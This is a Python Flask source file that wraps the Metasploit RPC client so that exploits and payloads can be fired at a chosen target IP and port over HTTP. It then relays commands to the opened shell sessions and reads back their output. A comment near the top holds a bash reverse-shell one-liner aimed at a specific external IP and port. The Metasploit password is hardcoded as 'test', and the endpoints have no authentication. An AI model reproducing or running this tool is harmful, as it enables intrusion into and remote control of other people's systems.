
from pymetasploit3.msfrpc import MsfRpcClient

import socket
import os 
import sys , json
from flask import Flask
from signal import SIGTERM # or SIGKILL
#connect bash -i >& /dev/tcp/13.76.188.147/4444 0>&1

# Establishing a socket connection with the client 


import string
from flask import Blueprint, Response, request

ReverseShell = Blueprint('ReverseShell', __name__)
global Sockets 
Sockets= []
ConnectSockets = []
ClientMetasploit = MsfRpcClient('test',port=55552)
#load msgrpc ServerHost=0.0.0.0 ServerPort=55552 Pass=test

@ReverseShell.route('/openConnection', methods=['POST'])
def open_connection():
    try:
        data = request.form['inputdata']
        # LHOST = request.form['LHOST']
        # LPORT = request.form['LPORT']
        data = json.loads(data)
        LHOST = data['LHOST']
        LPORT = data['LPORT']
        exploit = ClientMetasploit.modules.use('exploit', data['exploit'])
        exploit['RHOSTS'] = data["ip_addr"]
        exploit['RPORT'] =  data["port"]
        if data['payload'].startswith("payload/"):
            data['payload'] = data['payload'][8:]
        payload = ClientMetasploit.modules.use('payload', data['payload'])
        exploit.target =  data['target']
        if 'LHOST' in payload: payload['LHOST'] = LHOST
        if 'LPORT' in payload: payload['LPORT'] = LPORT
        session = exploit.execute(payload= payload)
        session_string= json.dumps(session)
        return Response(session_string, status=200)
    except Exception as e:
        return Response(str(e), status=404)

@ReverseShell.route('/checkConnect', methods = ['GET'])
def check_connect():
    id = request.args['id']
    sessions = ClientMetasploit.sessions.list
    if id not in sessions.keys():
        return Response("Failed, no session opened", status = 404)

    else:
        return Response("Successed, session opened", status = 200) 


@ReverseShell.route('/closeConnection', methods=['GET'])
def close_connection():

    
    id = request.args['id']
    sessions = ClientMetasploit.sessions.list
    if id not in sessions.keys():
        return Response("Error, session is not open ", status=404)
    try:

        shell = ClientMetasploit.sessions.session(id)
        shell.stop()
        return Response("Close success", status=200)
    except Exception as e:
        return Response(str(e), status=404)

@ReverseShell.route('/send', methods=['GET'])
def send():
    message = request.args['message']
    id = request.args['id']
    
    sessions = ClientMetasploit.sessions.list
    if id not in sessions.keys():
        return Response("Error, session is not open ", status=404)
    try:

        shell = ClientMetasploit.sessions.session(id)
        shell.write(message)
        return Response("Send success", status=200)
    except Exception as e:
        return Response(str(e), status=404)

@ReverseShell.route('/receive', methods=['GET'])
def receive():
    if "length" in request.args: 
        length = int(request.args['length'])
    else: 
        length = 4096
        
    id = request.args['id']
    sessions = ClientMetasploit.sessions.list
    if id not in sessions.keys():  
        return Response("Error, session is not open ", status=404)
    try:
        
        shell = ClientMetasploit.sessions.session(id)
        return shell.read()
    
    except Exception as e:
        return Response(str(e), status=404)

def create_app():
    app = Flask(__name__)
    app.register_blueprint(ReverseShell, url_prefix='/')
    return app


if __name__ == '__main__':
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument('-p', '--port', default=3010, type=int, help='port to listen on')
    args = parser.parse_args()
    port = args.port
    app = create_app()
    
    app.run(host='0.0.0.0', port=port)
